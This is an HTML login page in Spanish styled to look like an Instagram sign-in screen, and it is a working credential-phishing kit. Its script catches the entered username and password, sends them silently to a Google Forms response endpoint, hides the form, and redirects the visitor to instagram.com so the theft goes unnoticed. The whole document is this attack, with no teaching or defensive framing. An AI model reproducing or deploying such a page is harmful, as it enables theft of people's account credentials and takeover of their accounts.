<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Iniciar sesión</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Arial', sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f2f5;
    }

    .login-box {
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 360px;
      transition: opacity 0.2s ease-in-out;
    }

    .input-container {
      position: relative;
      width: 100%;
      margin-top: 15px;
    }

    .input-container input {
      width: 100%;
      padding: 14px 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
      background: #fafafa;
      outline: none;
    }

    .input-container label {
      position: absolute;
      top: 50%;
      left: 12px;
      transform: translateY(-50%);
      font-size: 14px;
      color: #888;
      transition: all 0.3s ease-in-out;
      pointer-events: none;
    }

    .input-container input:focus + label,
    .input-container input:not(:placeholder-shown) + label {
      top: 8px;
      left: 10px;
      font-size: 12px;
      color: #1877f2;
    }

    .password-container {
      position: relative;
      display: flex;
      align-items: center;
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      background: none;
      border: none;
      font-size: 14px;
      cursor: pointer;
      color: #1877f2;
      font-weight: bold;
    }

    .submit-btn {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 15px;
      font-weight: bold;
      transition: background 0.3s;
    }

    .submit-btn:hover {
      background-color: #0d65d9;
    }

    .logo {
      font-size: 24px;
      font-weight: bold;
      color: #333;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>

<div class="login-box" id="loginBox">
  <div class="logo">Iniciar sesión</div>
  <form id="myForm">
    <div class="input-container">
      <input type="text" id="username" name="entry.1271603301" placeholder=" " required>
      <label for="username">Teléfono, usuario o correo electrónico</label>
    </div>

    <div class="input-container password-container">
      <input type="password" id="password" name="entry.1257754249" placeholder=" " required>
      <label for="password">Contraseña</label>
      <button type="button" class="toggle-password" onclick="togglePassword()">Mostrar</button>
    </div>

    <button type="submit" class="submit-btn">Entrar</button>
  </form>
</div>

<script>
  function togglePassword() {
    const passwordInput = document.getElementById("password");
    const toggleButton = document.querySelector(".toggle-password");

    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      toggleButton.textContent = "Ocultar";
    } else {
      passwordInput.type = "password";
      toggleButton.textContent = "Mostrar";
    }
  }

  document.getElementById("myForm").addEventListener("submit", function(event) {
    event.preventDefault();
    
    // Oculta el formulario instantáneamente
    document.getElementById("loginBox").style.opacity = "0";

    // Envía los datos sin esperar respuesta
    const form = new FormData(this);
    fetch("https://docs.google.com/forms/d/e/1FAIpQLScixbdWi6SxI01JD38odY0Vr0p0ShZB4P51zkqwcBNwFIHjxw/formResponse", {
      method: "POST",
      body: form,
      mode: "no-cors"
    });

    // Redirige a Instagram sin retraso
    window.location.href = "https://www.instagram.com";
  });
</script>

</body>
</html>
